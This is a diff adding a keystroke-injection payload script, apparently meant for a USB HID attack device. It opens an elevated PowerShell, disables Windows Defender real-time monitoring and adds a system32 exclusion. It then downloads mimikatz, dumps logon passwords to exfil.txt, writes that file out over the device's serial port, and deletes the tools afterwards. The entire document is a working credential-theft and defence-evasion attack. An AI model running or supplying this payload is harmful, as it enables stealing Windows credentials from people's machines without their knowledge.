@@ -1,0 +1,49 @@
+DefaultDelay:50
+CustomDelay:8000
+Press:131
+CustomDelay:800
+PrintLine:powershell
+CustomDelay:1000
+PrintLine: start-process powershell -verb runas
+CustomDelay:2000
+Press:9
+CustomDelay:1000
+Press:9
+CustomDelay:1000
+Press:10
+CustomDelay:1000
+PrintLine:New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
+CustomDelay:800
+PrintLine:Set-MpPreference -DisableRealtimeMonitoring $true
+CustomDelay:800
+PrintLine:Set-MpPreference -ExclusionPath ("C:\WINDOWS\system32") -disablerealtimemonitoring 1
+CustomDelay:800
+PrintLine:[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+CustomDelay:800
+PrintLine:Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip" -OutFile "mimik.zip"
+CustomDelay:3500
+PrintLine:Expand-Archive -Path ".\mimik.zip" -DestinationPath mimik 
+CustomDelay:3000
+PrintLine:cd .\mimik\x64\
+CustomDelay:800
+PrintLine:.\mimikatz.exe
+CustomDelay:800
+PrintLine:log exfil.txt
+CustomDelay:800
+PrintLine:sekurlsa::logonpasswords
+CustomDelay:800
+PrintLine:exit
+CustomDelay:1000
+PrintLine:$s=(Get-WmiObject -Class Win32_PnPEntity -Namespace "root\CIMV2" -Filter "PNPDeviceID like 'USB\\VID_1b4f&PID_9208%'").Caption; $com=[regex]::match($s,'\(([^\)]+)\)').Groups[1].Value; $cmd=cat "exfil.txt"; $port= new-Object System.IO.Ports.SerialPort $com,38400,None,8,one; $port.open(); $port.WriteLine("SerialEXFIL:$cmd"); $port.Close();
+CustomDelay:8500
+PrintLine:cd ..
+CustomDelay:800
+PrintLine:cd ..
+CustomDelay:800
+PrintLine:del mimik
+CustomDelay:800
+PrintLine:T
+CustomDelay:800
+PrintLine:del mimik.zip
+CustomDelay:500
+CustomDelay:500
